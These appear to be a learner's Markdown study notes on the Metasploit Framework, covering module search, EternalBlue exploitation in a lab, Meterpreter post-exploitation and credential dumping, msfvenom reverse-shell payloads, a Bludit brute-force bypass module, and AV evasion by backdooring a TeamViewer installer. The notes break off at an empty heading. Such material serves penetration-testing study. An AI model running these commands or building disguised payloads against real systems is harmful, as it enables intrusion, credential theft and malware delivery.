# Preface
Some argue tools are a crutch that prevent "proving yourself", while others (especially beginners) see them as valuable learning aids and time-savers.
## Discipline
- Create comfort zones that stunt skill growth
- Enable low-skill malicious actors
- Cause tunnel vision ("if the tool can't do it, neither can I")
## Conclusion
- Time is always limited in real assessments; tools help prioritize high-impact findings
- Clients don't care how you found it, they want results
- Your only audience is yourself; don't use tools to impress others, use them to do the job well
## Core Takeaway
Tools are valid and necessary, but treat them as one instrument in your methodology, not a backbone. Know them deeply (read the docs, understand behavior), and they'll save you time for the more complex, creative parts of an assessment.

Basically: don't be a tool snob, but don't be a tool zombie either.
# Introduction to Metasploit
Metasploit is a ruby-based, modular pentesting platform for writing, testing, and executing exploits. Think of it as a swiss army knife, not a solution to everything, but covers the most common unpatched vulnerabilities efficiently.

## Two Versions

| Feature   | **Framework** (Free) | **Pro** (Paid)                                                                                      |
| --------- | -------------------- | --------------------------------------------------------------------------------------------------- |
| License   | Open source          | Commercial                                                                                          |
| Interface | CLI (`msfconsole`)   | CLI + GUI                                                                                           |
| Extras    | Core modules         | Social engineering, Nexpose integration, task chains, reporting, team collab, phishing wizard, etc. |
## msfconsole
The primary and most stable interface. Key perks:
- Only supported way to access most MSF features
- Tab completion, readline support
- Can run external commands directly
- Manages multiple targets via sessions and jobs (like browser tabs)
## Architecture

| Directory        | Purpose                                                                                         |
| ---------------- | ----------------------------------------------------------------------------------------------- |
| `modules/`       | Core attack modules: `auxiliary`, `encoders`, `evasion`, `exploits`, `nops`, `payloads`, `post` |
| `plugins/`       | Extra functionality (sqlmap, nessus, openvas, etc.) loaded on demand                            |
| `scripts/`       | Meterpreter scripts and utilities                                                               |
| `tools/`         | CLI utilities: `exploit`, `password`, `recon`, `payloads`, etc.                                 |
| `data/` + `lib/` | Framework internals                                                                             |
| `documentation/` | Technical docs                                                                                  |
# Introduction to MSFconsole
## Launching msfconsole

|Command|Effect|
|---|---|
|`msfconsole`|Launch with splash art/banner|
|`msfconsole -q`|Launch quietly (no banner)|
|`help`|List all available commands (inside msfconsole)|
## Keeping Metasploit Updated

```bash
sudo apt update && sudo apt install metasploit-framework
```

> `msfupdate` is the old way — use `apt` now.

## Enumeration First
Before touching any exploit, you need to enumerate the target:
- What services are running? (HTTP, FTP, SQL, etc.)
- What versions? -> Versions are the key - outdated/unpatched services are your entry point.

## MSF Engagement Structure
1. Enumeration: Service Validation, Vulnerability Research
2. Preparation: Code Auditing
3. Exploitation: Module Execution
4. Privilege Escalation
5. Post-Exploitation: Pivoting, Data Exfiltration
## MSF Engagement Structure
### 1. Enumeration
**Service Validation**
- Passive Scanning
    - OSINT
    - Interacting with services legitimately
    - whois / DNS records
- Active Scanning
    - nMap / Nessus / NexPose scans
    - Web service identification tools
    - Built-with identification tools

**Vulnerability Research**
- VulnDB (GUI)
- Rapid7 (GUI)
- SearchSploit (CLI)
- Google Dorking (GUI)
    - `> search [vuln. name]` → `> use [index no.]`

→ _Proceed to Preparation_
### 2. Preparation
- Code Auditing
- Dependency Check
- Importing Custom Modules

→ _Proceed to Exploitation_
### 3. Exploitation
**Run Module Locally**
- **Options** (`> show options`)
    - URI, PROXIES, RHOST/RPORT, USERNAMES, PASSWORDS, DICTIONARIES, SESSION
    - `> set [option] [value]`
- **Payloads** (`> show payloads`)
    - Meterpreter, Shell Binds, Reverse Shells, EXE
    - `> set payload [index no.]`
- **Targets** (`> show targets`)
    - Linux, Windows, MacOS, Others
    - `> set target [OS]`
- **`> run`**
### 4. Privilege Escalation
- Vulnerability Research
- Credential Gathering
- Token Impersonation

> _Return to Enumeration, repeat until highest privilege obtained_
### 5. Post-Exploitation
- Pivoting to Other Systems
- Credential Gathering
- Data Exfiltration
- Cleanup

→ _Next target_ (loop back to Enumeration)
# Modules
## Modules Syntax
```bash
<No.> <type>/<os>/<service>/<name>
# Example:
794   exploit/windows/ftp/scriptftp_list
```

## Module Types

|Type|Description|Interactable?|
|---|---|---|
|`auxiliary`|Scanning, fuzzing, sniffing, admin|✅|
|`exploits`|Exploit a vuln to deliver payload|✅|
|`post`|Post-exploitation: gather info, pivot|✅|
|`payloads`|Code that runs remotely, calls back to attacker|❌|
|`encoders`|Keep payloads intact in transit|❌|
|`nops`|Keep payload sizes consistent|❌|
|`plugins`|Extra scripts integrated into msfconsole|❌|

> Only `auxiliary`, `exploits`, and `post` can be selected with `use <no.>`

## Initiators

| **Type**    | **Description**                                                                                |
| ----------- | ---------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.      |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                |

## Searching for Modules
```bash
search eternalromance # by name
search eternalromance type:exploit # filter by type
search type:exploit platform:windows cve:2021 rank:excellent microsoft  # multi-filter
```
**Search keywords:** `cve`, `type`, `platform`, `rank`, `author`, `port`, `date`, `name`, `path`

## Workflow — Full Example (MS17-010 / EternalRomance)
**1. Enumerate the target**
```bash
nmap -sV 10.10.10.40
# Found: port 445 open → SMB → Windows 7
```

**2. Search & select module**
```bash
msf6 > help search
msf6 > search eternalromance type:exploit
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
msf6 > search ms17_010
msf6 > use 0                          # select by index
msf6 > info                           # detailed module info
msf6 > show options                   # see required parameters
```

**3. Set parameters**
```bash
set RHOSTS 10.10.10.40        # target IP (session-scoped)
setg RHOSTS 10.10.10.40       # target IP (persistent across modules)
setg LHOST 10.10.14.15        # your IP (for reverse shell callback)
# LPORT defaults to 4444
```

**4. Run**
```bash
run
# or
exploit
```

**5. Result**
```bash
meterpreter> shell
C:\Windows\system32> whoami
nt authority\system            # full SYSTEM access
```

## Key Notes
- `set` → applies only to current module
- `setg` → applies globally until MSF restarts
- `show options` → always check required fields before running
- A failed exploit ≠ vulnerability doesn't exist — MSF modules sometimes need customization
- Default payload (`windows/meterpreter/reverse_tcp`) is often sufficient for basic cases

# Targets
Unique OS/version identifiers that adapt an exploit to run correctly on a specific environment. They account for differences in:
- OS version & service pack
- Software version
- Language pack (affects memory addresses)
- Return addresses (`jmp esp`, `pop/pop/ret`, etc.)

## Key Commands
```bash
show targets              # list all available targets for selected exploit
set target <index no.>    # manually select a specific target
info                      # read exploit details + available targets
```
> `show targets` outside a module → error: _"No exploit module selected"_

## Target Selection Strategy

|Scenario|Approach|
|---|---|
|Don't know exact target version|Leave on `Automatic` — MSF runs service detection first|
|Know exact OS + software version|`set target <id>` manually for better reliability|
## Example
```
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7

msf6 > set target 6     # IE 9 on Windows 7
```
## How to Identify a Target Manually
1. Obtain a copy of the target binaries
2. Use `msfpescan` to locate a suitable return address
> Return addresses vary per language pack, software version, and memory hooks — this is why target selection matters.

# Payloads
It refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (`exploits job`) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (`payload's job`).
## Payload Types
| Type        | Description                                                                              |
| ----------- | ---------------------------------------------------------------------------------------- |
| **Singles** | Self-contained, exploit + shellcode in one. Stable but large. No `/` separator in name.  |
| **Stagers** | Small, sets up the comms channel, waits for Stage.                                       |
| **Stages**  | Downloaded by stager, no size limit. Delivers advanced features (Meterpreter, VNC, etc.) |
## How to read payload names:
```bash
windows/shell_bind_tcp       # Single (no slash after shell)
windows/shell/bind_tcp       # Staged (stager=bind_tcp, stage=shell)
```

## Common Payload Commands
```bash
show payloads                              # list all payloads (context-aware inside a module)
grep meterpreter show payloads             # filter by keyword
grep -c meterpreter show payloads          # count matches
grep meterpreter grep reverse_tcp show payloads   # chain filters
set payload <index no.>                    # select payload
```

## Meterpreter
- Uses **DLL injection** → lives entirely in memory, no disk traces
- Hard to detect, persistent across reboots
- Spawns its own interface with dedicated commands

## **Key Meterpreter commands:**

|Category|Command|Description|
|---|---|---|
|Identity|`getuid`|Current user (≠ `whoami`)|
|Identity|`getsid`|User SID|
|System|`sysinfo`|OS info|
|System|`ps`|Running processes|
|System|`getpid`|Current PID|
|System|`getprivs`|Available privileges|
|System|`shell`|Drop into Windows CMD|
|System|`execute`|Run a command|
|System|`reboot` / `shutdown`|Remote power control|
|System|`clearev`|Clear event logs|
|Filesystem|`ls` / `dir`|List files|
|Filesystem|`cd`|Change directory|
|Filesystem|`cat`|Read file|
|Filesystem|`upload` / `download`|Transfer files|
|Filesystem|`search`|Search for files|
|Filesystem|`mkdir` / `rm` / `rmdir`|File management|
|Network|`ifconfig` / `ipconfig`|Network interfaces|
|Network|`netstat`|Active connections|
|Network|`portfwd`|Port forwarding|
|Network|`route`|Routing table|
|Network|`arp`|ARP cache|
|Priv Esc|`getsystem`|Attempt SYSTEM elevation|
|Priv Esc|`steal_token`|Token impersonation|
|Priv Esc|`hashdump`|Dump SAM hashes|
|Session|`background` / `bg`|Background session|
|Session|`sessions`|Switch sessions|
|Session|`migrate`|Migrate to another process|
|UI|`screenshot`|Grab desktop screenshot|
|UI|`screenshare`|Live desktop view|
|UI|`keyscan_start/stop/dump`|Keylogger|
|Webcam|`webcam_snap`|Take webcam photo|
|Webcam|`record_mic`|Record microphone|
## Full Workflow Example
```bash
# 1. Search & select
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Find payload
msf6 > grep meterpreter grep reverse_tcp show payloads
msf6 > set payload 15        # windows/x64/meterpreter/reverse_tcp

# 3. Configure
msf6 > ifconfig              # check your IP
msf6 > set RHOSTS 10.10.10.40
msf6 > set LHOST 10.10.14.15
# RPORT=445 and LPORT=4444 are defaults

# 4. Run
msf6 > run

# 5. Post-exploitation
meterpreter > getuid         # NT AUTHORITY\SYSTEM
meterpreter > shell          # drop into Windows CMD
C:\> whoami                  # nt authority\system
```

## Common Windows Payload Types
|Payload|Description|
|---|---|
|`generic/shell_reverse_tcp`|Generic reverse shell|
|`windows/x64/shell_reverse_tcp`|Single reverse shell|
|`windows/x64/shell/reverse_tcp`|Staged reverse shell|
|`windows/x64/meterpreter/$`|Meterpreter + variants|
|`windows/x64/powershell/$`|Interactive PowerShell|
|`windows/x64/vncinject/$`|VNC injection|
|`windows/x64/exec`|Execute arbitrary command|
|`windows/x64/messagebox`|Spawn a dialog box|

> Reverse shells are preferred over bind shells — outbound traffic is less filtered by firewalls.
# Encoders
Encoders serve two main functions:
1. Architecture compatibility: Adapt payloads for different CPU architectures (x86, x64, MIPS, SPARC, PPC)
2. Bad character removal: Strip null bytes or other opcodes that would break execution.

## Selecting an Encoder
- Pre-2015: `msfpayload` + `msfencode` as separate tools piped together
- Post-2015: Both merged into `msfvenom`

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

### Generating Payload - Without Encoding
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

### Generating Payload - With Encoding
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

## Shikata Ga Nai (SGN)
- Historically the go-to encoder (polymorphic XOR additive feedback)
- Name means _"it cannot be helped"_ in Japanese
- **Now largely obsolete for AV evasion** — modern IPS/IDS signatures catch it easily

Suppose we want to select an Encoder for an existing payload. Them, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload`combination.

If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. 

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

This will generate a payload with the **`exe`** format, called **`TeamViewerInstall.exe`**, which is meant to work on **`x86`** architecture processors for the Windows platform, with a hidden **`Meterpreter reverse_tcp`** shell payload, **`encoded once with the Shikata Ga Nai`** Scheme. 

![[Pasted image 20260626141129.png]]

One better option would be try running it through multiple iterations of the same Encoding scheme:
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
![[Pasted image 20260626141213.png]]

## MSF - Virustotal
```bash
msf-virustotal -l <API key> -f TeamViewerInstall.exe
[*] Using API key: <API key>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
==================================================================================================================

```
## What actually matters
- Use `show encoders` inside msfconsole to see compatible encoders for your current exploit/payload combo
- For real AV evasion, you need techniques **outside the scope of encoders** (covered in later modules)
# Databases
These are used to keep track of your results. Msfconsole has built-in support for the PostgreSQL database system.

## Setting up the Database
### PostgreSQL commands
```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
sudo msfdb run
sudo msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q

msf6 > db_status
[*] Connected to msf. Connection type: PostgreSQL.

msf6 > help database
```

## Using the Database
### Workspaces
These are like folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
```bash
workspace                  # list workspaces (* = active)
workspace -a Target_1      # create workspace
workspace Target_1         # switch to workspace
workspace -d Target_1      # delete workspace
workspace -D               # delete all
workspace -r old new       # rename
workspace -v               # verbose list
```

## Importing Scan Results
```bash
db_import Target.xml       # import Nmap XML (preferred format)
db_nmap -sV -sS 10.10.10.8 # run Nmap directly
```
## Data Backup
### MSF - DB Export
```
msf6 > db_export -h
msf6 > db_export -f xml backup.xml
```

## Hosts
This command (`hosts`) command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. 
```bash
hosts                        # list discovered hosts
hosts -R                     # set RHOSTS from results
hosts -S <string>            # search/filter
hosts -c address,os_name     # show specific columns
hosts -o file.csv            # export to CSV
hosts -h                     # stored hosts
```

## Services
The `services` command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.
```bash
services                     # list discovered services
services -p 445              # filter by port
services -s smb              # filter by service name
services -r tcp              # filter by protocol
services -R                  # set RHOSTS from results
```

## Credentials
The `creds` command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.

```bash
creds                                          # list all credentials
creds add user:admin password:pass123          # add manually
creds add user:admin ntlm:<hash>               # add NTLM hash
creds add user:root ssh-key:/path/to/id_rsa    # add SSH key
creds -p 22,445                                # filter by port
creds -t ntlm                                  # filter by type
creds -d -s smb                                # delete SMB creds
creds -o hashes.hcat                           # export hashcat format
```
## Loot
The `loot` command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
```
loot                                           # list all loot (hash dumps, passwd, shadow)
loot -t hash                                   # filter by type
loot -f file -i "info" -a 10.10.10.40 -t hash # add loot manually
loot -d 10.10.10.40                            # delete loot for host
```

## Backup & Export
```bash
db_export -f xml backup.xml      # export full workspace to XML
db_export -f pwdump backup.txt   # export in pwdump format
```

## Key Takeaway
Run `db_nmap` instead of plain `nmap` whenever inside msfconsole — results auto-populate `hosts` and `services` tables, saving you the manual import step.

# Plugins
These are third-party software integrations that hook directly into the Metasploit API. They extend msfconsole with new commands, automate repetitive tasks, and unify workflows. So, instead of jumping between tools, everything feeds into your MSF database automatically. 
## Using Plugins
```bash
ls /usr/share/metasploit-framework/plugins
msf6 > load nessus    # load a plugin
nessus_help           # see available commands for that plugin
```

## Installing new Plugins
```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
###################### Inside msfconsole #################
load pentest
help            # new commands will appear automatically in the help menu
```
## Notable Plugins

| Plugin        | Purpose                                                                 |
| ------------- | ----------------------------------------------------------------------- |
| **Nessus**    | Bridge to Nessus scanner — run scans, pull vulnerabilities              |
| **NexPose**   | Similar to Nessus, imports vuln scan results                            |
| **Mimikatz**  | Credential dumping on Windows targets                                   |
| **Incognito** | Token impersonation (privilege escalation)                              |
| **pentest**   | Adds discovery, auto-exploitation, and post-exploitation batch commands |
| **wmap**      | Web application scanner integration                                     |
| **sqlmap**    | SQLi automation bridge                                                  |
## Mixins
Mixins are a Ruby OOP concept used internally by MSF module developers. They let a class _include_ functionality from another class without inheriting from it — think of it as modular feature injection.

**You don't need to use them as a pentester**, but knowing they exist explains why MSF modules are so composable and customizable under the hood.
# Sessions
A session is a dedicated communication channel opened with a target after a successful exploit. Multiple sessions can run simultaneously, letting you manage several compromised hosts from one msfconsole instance.
```bash
sessions              # list all active sessions
sessions -i 1         # interact with session 1
background            # background current session (inside Meterpreter)
# or: [CTRL] + [Z]   # same effect from any module
```
Sessions persist in the background while you work on other modules. They can die if the payload runtime fails or the channel drops.
### **Typical post-exploitation flow:**
1. Exploit succeeds → session opens
2. Background the session
3. Load a `post/` module (cred gatherer, local exploit suggester, internal scanner)
4. Set `SESSION` to the backgrounded session number
5. Run the post module against it
## Jobs
A job is a module running in the background, independent of any session. Critical distinction:
- Killing a session with `[CTRL] + [C]` **does not free the port** — the process lingers
- You must manage that with `jobs` instead

```bash
jobs -l               # list all running jobs
jobs -i 1             # detailed info on job 1
jobs -k 1             # kill job by ID
jobs -K               # kill ALL jobs
jobs -p 1             # persist job across restarts

exploit -j            # run exploit as a background job instead of foreground
exploit -J            # force foreground even if passive
```

## Key Distinction

| Session     | Job                               |                                            |
| ----------- | --------------------------------- | ------------------------------------------ |
| What it is  | Communication channel with target | Background task/process                    |
| Created by  | Successful exploit                | `exploit -j` or backgrounding modules      |
| Killed with | `sessions -k`                     | `jobs -k`                                  |
| Use case    | Post-exploitation interaction     | Listeners, passive exploits, port handlers |
# Meterpreter
It is a Metasploit payload that runs **entirely in memory** on the target. No files written to disk, no new processes created. It injects itself into an existing compromised process and communicates over AES-encrypted channels. This makes it stealthy against forensic analysis and hard to detect. 

Called the "swiss army knife" of pentesting because it centralizes post-exploitation: privilege escalation, credential dumping, pivoting, persistence, and more. 

## How it loads
1. Target executes the initial stager (reverse/bind shell)
2. Stager loads the Reflective DLL via `ReflectiveDLL injection`
3. Meterpreter core initializes + establishes AES-encrypted socket
4. Extensions load automatically (`stdapi` always, `priv` if admin rights available)

## Meterpreter Commands
```bash
# Identity & system info
getuid                        # current user
ps                            # list running processes

# Process migration (useful when getuid is denied)
steal_token <PID>             # impersonate token of another process
migrate <PID>                 # migrate Meterpreter into another process

# Shell & navigation
shell                         # drop into OS shell
background / bg               # background session

# Credential dumping (requires SYSTEM)
hashdump                      # dump SAM hashes (LM + NTLM)
lsa_dump_sam                  # dump SAM database with full details
lsa_dump_secrets              # dump LSA secrets (service passwords, cached creds)

# Extensions & modules
load <extension>              # load a Meterpreter extension
run <post_module>             # run a post-exploitation module
```
## Typical Post-Exploitation Flow
```bash
foothold (low priv shell)
→ ps → find a privileged process
→ steal_token / migrate → gain higher user context
→ bg → load local_exploit_suggester
→ identify privesc vector
→ run privesc exploit → SYSTEM shell
→ hashdump / lsa_dump_secrets → credential loot
→ pivot if networked environment
```

## local_exploit_suggester
A critical post module — attach it to an existing session and it automatically checks dozens of local privilege escalation exploits against the target:
```
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

#### Dumping hashes
```
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```
## Key Takeaways
- `getuid` failing with "Access Denied" means your process token is too weak — use `steal_token` on a higher-privilege PID from `ps`
- Meterpreter leaves an artifact on disk **only during the initial upload phase** — the stager file — which MSF tries to auto-delete; failure to delete it is an OPSEC liability
- `lsa_dump_secrets` goes beyond hashes — it exposes plaintext service account passwords stored in LSA, which is often more valuable
# Writing and Importing Modules
## Importing from ExploitDB
Find modules tagged as "Metasploit Framework" on ExploitDB, or use `searchsploit` from the CLI:
```
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"
```

> `.rb` files are Ruby scripts — candidates for MSF modules. Not all `.rb` files are MSF-compatible though.

Download the `.rb` file and copy it into the correct directory:
```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

> **Naming convention:** always use `snake_case` with alphanumeric characters and underscores — no dashes.

Then load it into msfconsole using one of these methods:
```bash
# Option 1 — launch with module path
msfconsole -m /usr/share/metasploit-framework/modules/

# Option 2 — load path inside msfconsole
loadpath /usr/share/metasploit-framework/modules/

# Option 3 — reload all modules inside msfconsole
reload_all
```

Then use it normally:
```bash
use exploit/unix/webapp/nagios3_command_injection
show options
```
## Key directory structure
```
/usr/share/metasploit-framework/
    modules/        ← exploits, auxiliaries, post modules
    plugins/        ← plugins (.rb)
    scripts/        ← Meterpreter scripts

~/.msf4/
    modules/        ← user-local custom modules
    plugins/        ← user-local plugins
    loot/
    logs/
```

## Porting a Custom Script to MSF
When no existing module covers your target, you write one in Ruby. The workflow is:
1. Find an existing module in the same category as boilerplate
2. Copy it and rename it following snake_case convention
3. Adjust the header fields and `include` mixins as needed

## **Common mixins and their purpose**
|Mixin|Purpose|
|---|---|
|`Msf::Exploit::Remote::HttpClient`|Act as HTTP client against a web target|
|`Msf::Exploit::PhpEXE`|Generate a first-stage PHP payload|
|`Msf::Exploit::FileDropper`|Transfer files + auto-cleanup after session|
|`Msf::Auxiliary::Report`|Report findings to the MSF database|
## **Module skeleton structure:**
```bash
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Module Name",
      'Description'    => "What it does",
      'Author'         => ['author'],
      'References'     => [['CVE', '20XX-XXXXX']],
      'Platform'       => 'php',
      'DisclosureDate' => "YYYY-MM-DD",
    ))
    # Functions
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('USERNAME',  [true, 'Username']),
      OptPath.new('PASSWORDS',   [true, 'Wordlist path', '/path/to/list.txt'])
    ])
  end

  # exploit logic here
end
```
## Proof-of-Concept
```rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
            File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end
```
## Key Takeaway
Importing is straightforward — find, copy, `reload_all`. Porting requires Ruby knowledge and using existing modules as boilerplate. For most engagements you'll be importing, not writing from scratch.
# Introduction to MSFVenom
The merger of the old `msfpayload` (shellcode generation) and `msfencode` (encoding/bad character removal) into a single tool. Used to craft custom payloads for specific target architectures, OS versions, and delivery formats outside of msfconsole. 
## Core Syntax
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> > output_file
```

### Common flags

|Flag|Purpose|
|---|---|
|`-p`|Payload to use|
|`-f`|Output format (aspx, exe, elf, php, raw...)|
|`-e`|Encoder to apply|
|`-i`|Number of encoding iterations|
|`-b`|Bad characters to avoid (e.g. `\x00`)|
|`-a`|Architecture (x86, x64)|
|`--platform`|Target platform (windows, linux...)|
|`-o`|Output file (alternative to `>`)|
### Example - ASPX Reverse Shell (IIS target)
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

# Upload via FTP
ftp 10.10.10.5
# login as anonymous
put reverse_shell.aspx
```

Then trigger it by visiting `http://<target>/reverse_shell.aspx` in a browser.

## Setting up The Listener
Always start the listener **before** triggering the payload:
```bash
msfconsole -q
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run
```

> `multi/handler` is the universal listener — it catches any reverse connection regardless of payload type.

## Post-Exploitation Flow (from low-priv shell)
```bash
# Check current user
getuid

# Check system architecture
sysinfo

# Background session and run local exploit suggester
background
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

Then pick a suggested exploit and chain it:
```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <low_priv_session_id>
set LHOST tun0
set LPORT 1338         # use a different port than your first listener
run

# Verify escalation
getuid
# NT AUTHORITY\SYSTEM
```
## Key Takeaways
- Always use a **different LPORT** for your privesc payload than your initial shell — otherwise the handler conflicts
- If the Meterpreter session dies repeatedly, add an encoder (`-e x86/shikata_ga_nai`) to stabilize the payload
- `IIS APPPOOL\Web` is a low-privilege user by design — always run `local_exploit_suggester` when you land on it
- The presence of `aspnet_client` in an FTP directory is a clear signal the server runs ASP.NET — target `.aspx` payloads accordingly
- Not all `local_exploit_suggester` results will work — work down the list methodically
# Firewall and IDS/IPS Evasion
There are two types of protection:
## Endpoint protection
Software on the host itself (AV, antimalware, firewall). 
Examples: Avast, Malwarebytes, BitDefender.
## Perimeter protection
Physical/virtual devices at the network edge controlling what enters/exits. Often includes a DMZ between the public internet and internal network.

## Detection Methods (what you're evading)
|Method|How it works|
|---|---|
|**Signature-based**|Matches files/traffic against known malicious patterns — most common in AV|
|**Heuristic/Anomaly**|Compares behavior against a baseline — flags deviations|
|**Stateful Protocol Analysis**|Detects protocol misuse vs. known-good definitions|
|**SOC Live Monitoring**|Human analysts watching live network feeds|
## Evasion Technique 1 - Backdoored Executables
Inject payload into a legitimate executable using `-x` (template) and `-k` (keep original execution running in parallel):
```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

> `-k` spawns the payload in a separate thread so the legitimate program still runs, reducing suspicion.

## Evasion Technique 2 - Password-Protected Archives
